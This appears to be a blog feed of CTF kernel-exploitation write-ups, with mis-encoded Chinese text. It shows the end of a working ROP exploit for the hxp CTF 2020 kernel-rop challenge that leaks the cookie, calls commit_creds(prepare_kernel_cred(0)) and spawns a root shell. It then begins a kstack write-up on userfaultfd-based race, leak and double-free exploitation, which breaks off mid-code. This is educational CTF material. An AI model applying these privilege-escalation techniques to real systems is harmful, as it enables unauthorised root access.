class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_gadget_offset</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">40</span>;</span><br><span class="line">    <span class="type">uint64_t</span> leak[n];</span><br><span class="line">    <span class="built_in">read</span>(global_fd, leak, <span class="built_in">sizeof</span>(leak));</span><br><span class="line">    cookie = leak[<span class="number">2</span>];</span><br><span class="line">    image_base = leak[<span class="number">38</span>] - <span class="number">0xa157</span>;</span><br><span class="line">    swapgs_restore_regs_and_ret_to_uspace = image_base + <span class="number">0x200f10</span> + <span class="number">19</span>;</span><br><span class="line">    zero_rax_ret = image_base + <span class="number">0x3b91</span>;</span><br><span class="line">    pop_rax_ret = image_base + <span class="number">0x4d11</span>;</span><br><span class="line">    mov_eax_ind_rax_ret = image_base + <span class="number">0x4aae</span>;</span><br><span class="line">    pop_rdi_ret = image_base + <span class="number">0x38a0</span>;</span><br><span class="line">    ksymtab_prepare_kernel_cred = image_base + <span class="number">0xf8d4fc</span>UL;</span><br><span class="line">    ksymtab_commit_creds = image_base + <span class="number">0xf87d90</span>UL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print_leak</span>(leak, n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cookie: %p\n&quot;</span>, cookie);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;image base: %p\n&quot;</span>, image_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">current_state</span> global_cstate;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">read_address</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> write_n = <span class="number">50</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">16</span>;</span><br><span class="line">    <span class="type">uint64_t</span> rop[write_n];</span><br><span class="line">    rop[i++] = cookie;</span><br><span class="line">    rop[i++] = <span class="number">0</span>;            <span class="comment">// rbx</span></span><br><span class="line">    rop[i++] = <span class="number">0x1</span>;          <span class="comment">// r12</span></span><br><span class="line">    rop[i++] = <span class="number">0x20000000</span>;    <span class="comment">// rbp</span></span><br><span class="line">    rop[i++] = pop_rax_ret;</span><br><span class="line">    <span class="keyword">if</span>(global_cstate == current_state_read_ksymtab_prepare_kernel_cred)&#123;</span><br><span class="line">        rop[i++] = ksymtab_prepare_kernel_cred - <span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(global_cstate == current_state_read_ksymtab_commit_creds)&#123;</span><br><span class="line">        rop[i++] = ksymtab_commit_creds - <span class="number">0x10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;state error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = mov_eax_ind_rax_ret;</span><br><span class="line">    rop[i++] = user_sp; <span class="comment">// pop rbp</span></span><br><span class="line">    rop[i++] = swapgs_restore_regs_and_ret_to_uspace;</span><br><span class="line">    rop[i++] = <span class="number">0xccdd</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x33333</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x666666</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x666666</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x666666</span>;</span><br><span class="line">    rop[i++] = (<span class="type">uint64_t</span>)safe_exit;    <span class="comment">//rip</span></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    <span class="built_in">write</span>(global_fd, rop, <span class="built_in">sizeof</span>(rop));</span><br><span class="line">    <span class="comment">// Should never be reached</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">escalate_privileges</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> write_n = <span class="number">50</span>;</span><br><span class="line">    <span class="type">uint64_t</span> rop[write_n];</span><br><span class="line">    <span class="type">int</span> i = <span class="number">16</span>;</span><br><span class="line">    rop[i++] = cookie;</span><br><span class="line">    rop[i++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    rop[i++] = <span class="number">0x1</span>; <span class="comment">// r12</span></span><br><span class="line">    rop[i++] = <span class="number">0x20000000</span>; <span class="comment">// rbp</span></span><br><span class="line">    <span class="keyword">if</span> (global_cstate == current_state_escalate_privileges_stage1)&#123;</span><br><span class="line">        rop[i++] = pop_rdi_ret; </span><br><span class="line">        rop[i++] = <span class="number">0</span>; <span class="comment">// rdi</span></span><br><span class="line">        rop[i++] = user_sp; <span class="comment">// rbp</span></span><br><span class="line">        rop[i++] = prepare_kernel_cred;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(global_cstate == current_state_escalate_privileges_stage2)&#123;</span><br><span class="line">        rop[i++] = pop_rdi_ret; </span><br><span class="line">        rop[i++] = creds_struct_va; <span class="comment">// rdi</span></span><br><span class="line">        rop[i++] = user_sp; <span class="comment">// rbp</span></span><br><span class="line">        rop[i++] = commit_creds;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = swapgs_restore_regs_and_ret_to_uspace;</span><br><span class="line">    rop[i++] = <span class="number">0xccdd</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x33333</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x666666</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x666666</span>;</span><br><span class="line">    rop[i++] = <span class="number">0x666666</span>;</span><br><span class="line">    rop[i++] = (<span class="type">uint64_t</span>)safe_exit;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    <span class="built_in">write</span>(global_fd, rop, <span class="built_in">sizeof</span>(rop));</span><br><span class="line">    <span class="comment">// Should never be reached</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">safe_exit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> rax;</span><br><span class="line">    <span class="type">uint64_t</span> rbp;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="string">&quot;mov %%rax, %0\n\t&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">        : <span class="string">&quot;=r&quot;</span>(rax), <span class="string">&quot;=r&quot;</span>(rbp)</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;returned from kernel: %lx\n&quot;</span>, rax);</span><br><span class="line">    <span class="keyword">if</span>(global_cstate == current_state_read_ksymtab_prepare_kernel_cred)&#123;</span><br><span class="line">        prepare_kernel_cred = ksymtab_prepare_kernel_cred + (<span class="type">int</span>)rax;</span><br><span class="line">        global_cstate = current_state_read_ksymtab_commit_creds;</span><br><span class="line">        <span class="built_in">read_address</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(global_cstate == current_state_read_ksymtab_commit_creds)&#123;</span><br><span class="line">        commit_creds = ksymtab_commit_creds + (<span class="type">int</span>)rax;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred: 0x%lx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;commit_creds : 0x%lx\n&quot;</span>, commit_creds);</span><br><span class="line">        global_cstate = current_state_escalate_privileges_stage1;</span><br><span class="line">        <span class="built_in">escalate_privileges</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(global_cstate == current_state_escalate_privileges_stage1)&#123;</span><br><span class="line">        creds_struct_va = rax;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;creds_struct_va: 0x%lx\n&quot;</span>, creds_struct_va);</span><br><span class="line">        global_cstate = current_state_escalate_privileges_stage2;</span><br><span class="line">        <span class="built_in">escalate_privileges</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(global_cstate == current_state_escalate_privileges_stage2)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">getuid</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Flag: \n&quot;</span>);</span><br><span class="line">            FILE *f = <span class="built_in">fopen</span>(<span class="string">&quot;/dev/sda&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="built_in">fread</span>(flag_buf, <span class="number">1</span>, <span class="built_in">sizeof</span>(flag_buf), f);</span><br><span class="line">            <span class="built_in">puts</span>(flag_buf);</span><br><span class="line">            <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;not root yet\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save_state</span>();</span><br><span class="line">    global_fd = <span class="built_in">open_dev</span>();</span><br><span class="line">    <span class="built_in">get_gadget_offset</span>();</span><br><span class="line">    global_cstate = current_state_read_ksymtab_prepare_kernel_cred;</span><br><span class="line">    <span class="built_in">read_address</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<br><a href="https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/">https://lkmidas.github.io/posts/20210205-linux-kernel-pwn-part-3/</a><br><a href="https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/">https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> KERNEL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel_pwn userfaultfd</title>
      <link href="/2021/01/14/kernel_pwn(userfaultfd)/"/>
      <url>/2021/01/14/kernel_pwn(userfaultfd)/</url>
      
        <content type="html"><![CDATA[<h3 id="kernel-pwn-userfaultfd"><a href="#kernel-pwn-userfaultfd" class="headerlink" title="kernel_pwn userfaultfd"></a>kernel_pwn userfaultfd</h3><blockquote><p>userfaultfdçš„åˆ©ç”¨å§¿åŠ¿æ˜¯åœ¨realworld ctfçš„è®®é¢˜ç›´æ’­é‡Œè·Ÿç€BrieflyXå¤§ä½¬å­¦ä¹ çš„ï¼Œå¯¹è¯¥æ–¹æ³•å¾ˆæ˜¯å¥½å¥‡ï¼Œèµ›åå°±è°ƒäº†ä¸‹kstackã€‚</p></blockquote><span id="more"></span><p>userfaultfdæ˜¯ç§page faultçš„å¤„ç†æ–¹å¼ã€‚æ­£å¸¸å‘ç”Ÿé¡µç¼ºå¤±ä¼šå¼•å‘å¼‚å¸¸ï¼Œäº¤ç»™å†…æ ¸é‡Œçš„å¼‚å¸¸å¤„ç†ç¨‹åºå»è§£å†³ï¼Œä½†userfaultedæ˜¯è®©ç”¨æˆ·æ€çš„ç¨‹åºå»å¤„ç†è‡ªå·±çš„page faultã€‚<br>userfaultfdå…·ä½“çš„å·¥ä½œæµç¨‹ä»¥åŠå®ç°æœºåˆ¶åœ¨<a href="http://brieflyx.me/2020/linux-tools/userfaultfd-internals/">BrieflyXçš„åšå®¢</a>é‡Œè®²çš„å¾ˆæ¸…æ¥šäº†ï¼Œæˆ‘ä¸»è¦è®°å½•ä¸‹åškstackçš„è¿‡ç¨‹æ¥åŠ æ·±å¯¹è¯¥æœºåˆ¶çš„ç†è§£ã€‚</p><p>kstacké¢˜ç›®ç»™å‡ºäº†æºç ï¼Œå®ç°äº†pushå’Œpopæ“ä½œï¼Œæ¶‰åŠçš„ç»“æ„ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Element</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> owner;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> value;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">Element</span> *<span class="title">fd</span>;</span></span><br><span class="line">&#125; Element;</span><br></pre></td></tr></table></figure><p>owneræ ‡è¯†æ‰€å±è¿›ç¨‹çš„PIDï¼Œvalueå³å­˜å‚¨çš„æ•°æ®ï¼ŒfdæŒ‡å‘ä¸‹ä¸€ä¸ª_Elementç»“æ„ä½“ï¼ˆä»¥é“¾è¡¨çš„æ–¹å¼ç»„ç»‡ï¼‰ã€‚</p><p>ä¸»è¦é€»è¾‘åœ¨<code>proc_ioctl()</code>å‡½æ•°é‡Œï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span> <span class="title">proc_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Element *tmp, *prev;</span><br><span class="line">  <span class="type">int</span> pid = <span class="built_in">task_tgid_nr</span>(current);</span><br><span class="line">  <span class="keyword">switch</span>(cmd) &#123;</span><br><span class="line">  <span class="keyword">case</span> CMD_PUSH:</span><br><span class="line">    tmp = <span class="built_in">kmalloc</span>(<span class="built_in">sizeof</span>(Element), GFP_KERNEL);</span><br><span class="line">    tmp-&gt;owner = pid;</span><br><span class="line">    tmp-&gt;fd = head;</span><br><span class="line">    head = tmp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">copy_from_user</span>((<span class="type">void</span>*)&amp;tmp-&gt;value, (<span class="type">void</span>*)arg, <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>))) &#123;</span><br><span class="line">      head = tmp-&gt;fd;</span><br><span class="line">      <span class="built_in">kfree</span>(tmp);</span><br><span class="line">      <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">case</span> CMD_POP:</span><br><span class="line">    <span class="keyword">for</span>(tmp = head, prev = <span class="literal">NULL</span>; tmp != <span class="literal">NULL</span>; prev = tmp, tmp = tmp-&gt;fd) &#123;</span><br><span class="line">      <span class="keyword">if</span> (tmp-&gt;owner == pid) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">copy_to_user</span>((<span class="type">void</span>*)arg, (<span class="type">void</span>*)&amp;tmp-&gt;value, <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>)))</span><br><span class="line">          <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        <span class="keyword">if</span> (prev) &#123;</span><br><span class="line">          prev-&gt;fd = tmp-&gt;fd;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          head = tmp-&gt;fd;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">kfree</span>(tmp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (tmp-&gt;fd == <span class="literal">NULL</span>) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€»è¾‘ä¹Ÿæ¯”è¾ƒç®€å•äº†ï¼Œpushå…ˆkmallocä¸€ä¸ª<code>sizeof(Element)</code>å¤§å°çš„å†…å­˜ï¼Œä¹‹åè®¾ç½®ownerå¹¶é€šè¿‡å¤´æ’æ³•è¿å…¥é“¾è¡¨ï¼Œä¹‹åè°ƒç”¨<code>copy_from_user</code>ä»ç”¨æˆ·åŒºåŸŸè¯»å…¥æ•°æ®åˆ°valueï¼Œç„¶åæŠŠè¯¥ç»“ç‚¹åˆ é™¤å¹¶kfreeã€‚</p><p>popçš„è¯ä»å¤´éƒ¨æŸ¥æ‰¾ï¼Œæ‰¾åˆ°å±äºè¯¥è¿›ç¨‹çš„ç»“ç‚¹ï¼Œä¹‹åå°†è¯¥ç»“ç‚¹valueæ‹·è´åˆ°ç”¨æˆ·åŒºåŸŸï¼Œç„¶åæŠŠzheè¯¥ç»“ç‚¹åˆ é™¤å¹¶kfreeã€‚</p><p>çœ‹èµ·æ¥é€»è¾‘æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†å­˜åœ¨çš„ä¸€ä¸ªé—®é¢˜æ˜¯æ•´ä¸ªè¿‡ç¨‹æ²¡æœ‰åŠ é”ï¼Œå¹¶ä¸”å¯¹ç»“ç‚¹çš„åˆ é™¤æ“ä½œæ˜¯åœ¨<code>copy_from_user()</code>å’Œ<code>copy_to_user()</code>ä¹‹åçš„ã€‚</p><p>é‚£ä¹ˆå¦‚æœå¸¦ç€åˆ©ç”¨userfaultfdæ„é€ raceçš„æƒ³æ³•å†çœ‹è¿™ä¸ªé€»è¾‘çš„è¯å¦‚æœåœ¨pushæ—¶æ‰§è¡Œåˆ°<code>copy_from_user()</code>ï¼Œç”±äºç”¨æˆ·åŒºåŸŸargæ˜¯éœ€è¦userfaultfdçš„ï¼Œåˆ™è¯¥çº¿ç¨‹å°±ä¼šé˜»å¡åœ¨è¿™é‡Œï¼Œæ­¤æ—¶äº¤ç»™ç”¨æˆ·æ€çš„<code>fault_handler_thread</code>çº¿ç¨‹å¤„ç†ã€‚è¯¥çº¿ç¨‹æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œå¦‚æœå†æ§åˆ¶è¯¥çº¿ç¨‹æ‰§è¡Œpopæ“ä½œï¼Œæ­¤æ—¶å°±ä¼šå°†ä¹‹å‰pushçš„ç»“ç‚¹é‡Œçš„valueæ‹·è´åˆ°ç”¨æˆ·åŒºåŸŸã€‚</p><p>å› æ­¤å°±è¦æƒ³åŠæ³•ä½¿å¾—pushæ—¶kmallocæ‹¿åˆ°çš„chunkå¯¹åº”ç»“ç‚¹valueçš„ä½ç½®å­˜æ”¾æœ‰kernelé‡Œçš„åœ°å€ï¼Œè¿™é‡Œç”¨åˆ°çš„ä¸€ä¸ªæ–¹æ³•æ—¶åˆ©ç”¨<code>shm_file_date</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥ç»“æ„ä½“æ€»çš„å¤§å°å’ŒElementå¤§å°å·®ä¸å¤šï¼Œé€šè¿‡slabåˆ†é…0x24å¤§å°çš„chunkå­˜æ”¾ã€‚</p><p>é€šè¿‡è°ƒç”¨<code>shmget</code>å»ºç«‹ä¸€ä¸ªå…±äº«å†…å­˜å¯¹è±¡ï¼Œå¹¶<code>shmat</code>å°†å¯¹è±¡æ˜ å°„åˆ°è°ƒç”¨è¿›ç¨‹çš„åœ°å€ç©ºé—´ï¼Œä¹‹åé€šè¿‡<code>shmdt</code>åˆ é™¤ï¼Œåˆ™<code>shm_file_data</code>ä¹Ÿä¼šè¢«freeï¼Œä¹‹åå†é€šè¿‡pushçš„kmallocæ—¶å°±ä¼šæ‹¿åˆ°åˆšåˆšfreeçš„chunkï¼ŒåŒæ—¶å¯¹åº”vauleçš„ä½ç½®è¿˜æ®‹ç•™ç€ä¹‹å‰<code>struct ipc_namespace *ns</code>çš„å†…å®¹ï¼Œè¯¥æŒ‡é’ˆä¸€èˆ¬æŒ‡å‘å­˜åœ¨äº†çš„general namespaceï¼Œè¯¥åœ°å€æ—¶kernelçš„åœ°å€ï¼Œä»è€Œé…åˆä¸Šé¢çš„popåˆ°è¾¾leakåœ°å€çš„æ•ˆæœã€‚</p><p>è¿™é‡Œä¹Ÿæä¸€ä¸‹å¦‚ä½•åˆ›å»ºå¹¶æ³¨å†Œä¸€ä¸ªéœ€è¦é€šè¿‡userfaultfdçš„å¯¹è±¡ï¼š</p><p>åˆ›å»ºä¸€ä¸ªuserfaultfdå¯¹è±¡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line"><span class="keyword">if</span>(uffd == <span class="number">-1</span>)&#123;</span><br><span class="line">    errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">uffdio_api.api = UFFD_API;</span><br><span class="line">uffdio_api.features = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)&#123;</span><br><span class="line">    errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åmmapä¸€å—å†…å­˜ï¼Œmmapå‡ºæ¥çš„å†…å­˜åªæœ‰åœ¨çœŸæ­£ä½¿ç”¨åˆ°æ—¶æ‰ä¼šæ˜ å°„åˆ°ç‰©ç†å†…å­˜ï¼Œå› æ­¤å¯¹mmapå‡ºæ¥å†…å­˜çš„ç¬¬ä¸€ä¸ªr&#x2F;wæ“ä½œä¼šè§¦å‘page faultã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">len = <span class="number">4</span> * page_size;</span><br><span class="line">addr = mmap(<span class="literal">NULL</span>, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(addr == MAP_FAILED)&#123;</span><br><span class="line">    errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°†åŒºåŸŸæ³¨å†Œä¸ºuserfaultfdå¤„ç†æœºåˆ¶:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)addr;</span><br><span class="line">uffdio_register.range.len = len;</span><br><span class="line">uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">ioctl</span>(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="built_in">errExit</span>(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>leakå®Œåœ°å€åç»§ç»­åˆ©ç”¨userfaultfdçš„æœºåˆ¶ï¼Œpopä¸€ä¸ªéœ€è¦userfaultfdçš„å†…å­˜ï¼Œåœ¨æ‰§è¡Œåˆ°<code>copy_to_user()</code>æ—¶é˜»å¡ï¼Œæ­¤æ—¶åœ¨<code>fault_handler_thread</code>çº¿ç¨‹ä¸­å†æ‰§è¡Œä¸€æ¬¡popï¼Œç”±äºåˆ é™¤æ“ä½œè¿˜æœªæ‰§è¡Œï¼Œå› æ­¤å¤„ç†çš„æ˜¯åŒä¸€ä¸ªç»“ç‚¹ï¼Œåœ¨handlerçº¿ç¨‹é‡Œå°†è¯¥ç»“ç‚¹åˆ é™¤åå”¤é†’é˜»å¡åœ¨<code>copy_to_user()</code>çš„çº¿ç¨‹ç»§ç»­æ‰§è¡Œåˆ é™¤æ“ä½œï¼Œå°±ä¼šå¯¼è‡´ä¸€ä¸ªç»“ç‚¹è¢«freeä¸¤æ¬¡é€ æˆ<code>double free</code>ã€‚</p><p>æœ‰äº†åœ°å€å’Œ<code>double free</code>æ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•ææƒæˆ–æ‹¿flagäº†ã€‚è¦åˆ©ç”¨<code>double free</code>çš„è¯è¦æƒ³åŠæ³•ä¿®æ”¹chunkçš„å‰8ä¸ªå­—èŠ‚ä¸ºç›®çš„åœ°å€ï¼Œä»…ä»…é€šè¿‡pushçš„kmallocæ˜¯æ— æ³•å®ç°çš„è¿™é‡Œç”¨åˆ°äº†<code>userfaultfd + setxattr</code>çš„ç»„åˆæ‹³ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">long</span></span></span><br><span class="line"><span class="function"><span class="title">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span></span><br><span class="line"><span class="params"><span class="function">         <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="type">int</span> error;</span><br><span class="line">        <span class="type">void</span> *kvalue = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">void</span> *vvalue = <span class="literal">NULL</span>;    <span class="comment">/* If non-NULL, we used vmalloc() */</span></span><br><span class="line">        <span class="type">char</span> kname[XATTR_NAME_MAX + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">        error = <span class="built_in">strncpy_from_user</span>(kname, name, <span class="built_in">sizeof</span>(kname));</span><br><span class="line">        <span class="keyword">if</span> (error == <span class="number">0</span> || error == <span class="built_in">sizeof</span>(kname))</span><br><span class="line">                error = -ERANGE;</span><br><span class="line">        <span class="keyword">if</span> (error &lt; <span 